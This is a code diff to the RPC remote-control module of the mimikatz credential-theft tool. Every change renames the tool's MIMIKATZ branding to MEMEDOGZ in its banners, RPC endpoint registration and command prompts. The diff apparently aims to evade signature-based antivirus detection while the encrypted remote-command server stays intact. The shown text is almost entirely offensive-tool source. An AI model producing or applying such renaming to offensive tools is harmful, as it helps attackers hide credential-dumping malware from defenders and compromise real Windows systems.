@@ -18,7 +18,7 @@ const KUHL_M_C kuhl_m_c_rpc[] = {
 	{kuhl_m_rpc_enum,	L"enum",	NULL},
 };
 const KUHL_M kuhl_m_rpc = {
-	L"rpc",	L"RPC control of " MIMIKATZ,	NULL,
+	L"rpc",	L"RPC control of " MEMEDOGZ,	NULL,
 	ARRAYSIZE(kuhl_m_c_rpc), kuhl_m_c_rpc, kuhl_m_c_rpc_init, kuhl_m_c_rpc_clean
 };
 
@@ -222,12 +222,12 @@ DWORD WINAPI kuhl_m_rpc_server_start(LPVOID lpThreadParameter)
 
 					if(inf->publishMe)
 					{
-						status = RpcEpRegister(inf->srvif, vector, NULL, (RPC_WSTR) MIMIKATZ L" RPC communicator");
+						status = RpcEpRegister(inf->srvif, vector, NULL, (RPC_WSTR) MEMEDOGZ L" RPC communicator");
 						if(toUnreg = (status == RPC_S_OK))
 							kprintf(L" > RPC bind registered\n");
 						else PRINT_ERROR(L"RpcEpRegister: %08x\n", status);
 					}
-					kprintf(L" > RPC Server is waiting!\n\n" MIMIKATZ L" # ");
+					kprintf(L" > RPC Server is waiting!\n\n" MEMEDOGZ L" # ");
 					status = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);
 					kprintf(L" > RPC Server stopped\n");
 					if(toUnreg)
@@ -329,7 +329,7 @@ NTSTATUS kuhl_m_rpc_connect(int argc, wchar_t * argv[])
 						ntStatus = CLI_MimiBind(hBinding, &clientKey->publicKey, &serverKey, &hMimi);
 						if(NT_SUCCESS(ntStatus))
 						{
-							kprintf(MIMIKATZ L" is bound!\n");
+							kprintf(MEMEDOGZ L" is bound!\n");
 							if(kull_m_crypto_dh_CreateSessionKey(clientKey, &serverKey))
 								status = RPC_S_OK;
 							else PRINT_ERROR_AUTO(L"kull_m_crypto_dh_CreateSessionKey");
@@ -425,7 +425,7 @@ NTSTATUS SRV_MimiCommand(MIMI_HANDLE phMimi, DWORD szEncCommand, BYTE *encComman
 		{
 			if(kull_m_crypto_dh_simpleDecrypt(((PKIWI_DH) phMimi)->hSessionKey, encCommand, szEncCommand, (LPVOID *) &clearCommand, &szClearCommand))
 			{
-				kprintf(L"\n\n" MIMIKATZ L"(rpc): %s\n", clearCommand);
+				kprintf(L"\n\n" MEMEDOGZ L"(rpc): %s\n", clearCommand);
 				outputBufferElements = 0xffff;
 				outputBufferElementsPosition = 0;
 				if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
@@ -463,7 +463,7 @@ NTSTATUS SRV_MimiClear(handle_t rpc_handle, wchar_t *command, DWORD *size, wchar
 {
 	NTSTATUS status = RPC_S_INVALID_ARG;
 	EnterCriticalSection(&outputCritical);
-	kprintf(L"\n\n" MIMIKATZ L"(rpc): %s\n", command);
+	kprintf(L"\n\n" MEMEDOGZ L"(rpc): %s\n", command);
 	outputBufferElements = 0xffff;
 	outputBufferElementsPosition = 0;
 	if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
